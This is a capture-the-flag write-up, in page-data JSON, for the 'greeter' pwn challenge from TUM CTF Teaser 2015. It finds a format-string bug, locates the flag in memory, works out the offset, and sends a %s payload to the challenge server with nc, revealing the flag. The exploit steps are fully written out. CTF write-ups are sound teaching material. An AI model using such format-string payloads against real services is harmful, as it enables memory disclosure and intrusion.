{"componentChunkName":"component---src-templates-writeup-js","path":"/writeups/tum-ctf-teaser-2015/pwn/greeter/sudhackar","result":{"pageContext":{"html":"<p><a href=\"ctf=tum-ctf-teaser-2015\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=format-string\"></a></p>\n<p>#greeter (pwn 15)</p>\n<pre><code class=\"language-bash\">$ file ./greeter\n./greeter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2657dbbc9fbf7a266d2d963b4644d1c3b44d8304, not stripped\n</code></pre>\n<p>So we have a not stripped file.</p>\n<pre><code class=\"language-bash\">$ ./greeter \nHi, what's your name?\nAAAAA\nPwn harder, AAAAA!\n</code></pre>\n<p>We can send in a name. It suffers form format string vulnerability.</p>\n<pre><code>$ ./greeter \nHi, what's your name?\n%x.%x\nPwn harder, b5eeae30.7227d7a0!\n</code></pre>\n<p>A little bit of analysis shows that the file reads in flag.txt to an address called flag which is not on the stack. Its on the heap. Since it is not on the stack we can't use repeated %x to read it. Also since the file is not stripped we can see the locations of each variable.</p>\n<pre><code class=\"language-bash\">gdb-peda$ p &#x26;flag \n$1 = (char (*)[256]) 0x600ca0 &#x3C;flag>\n</code></pre>\n<p>%s is a format specifier that prints out a string ftarting from a given pointer.\nNow just figure out the offset.</p>\n<pre><code class=\"language-bash\">$ python -c 'print \"%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAA\"' | ./greeter \nHi, what's your name?\nPwn harder, ffa0b88010c3b7a0.1096f620.10e32700.78252e78.78257825.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.41414141.0.0.0.0.0.0.AAAA!\n</code></pre>\n<p>Payload format:</p>\n<blockquote>\n<p>format_string+p64(address)</p>\n</blockquote>\n<pre><code>>>> p64(0x600ca0)\n'\\xa0\\x0c`\\x00\\x00\\x00\\x00\\x00'\n</code></pre>\n<p>Finally</p>\n<pre><code class=\"language-bash\">$ python -c 'print \"%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s.%x.%x.%x.%x.%x.%x.\\xa0\\x0c`\\x00\\x00\\x00\\x00\\x00\"' | nc 1.ctf.link 1030\nHi, what's your name?\nPwn harder, 720fe23030bcc7a0.30900620.30dea700.78252e78.78257825.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.hxp{f0rm4t_sTr1ngs_r0ck}\n.a.0.0.0.0.0.ï¿½\n              `!\n</code></pre>\n<p>Flag</p>\n<blockquote>\n<p>hxp{f0rm4t_sTr1ngs_r0ck}</p>\n</blockquote>","relativePath":"writeups/tum-ctf-teaser-2015/pwn/greeter/sudhackar"}}}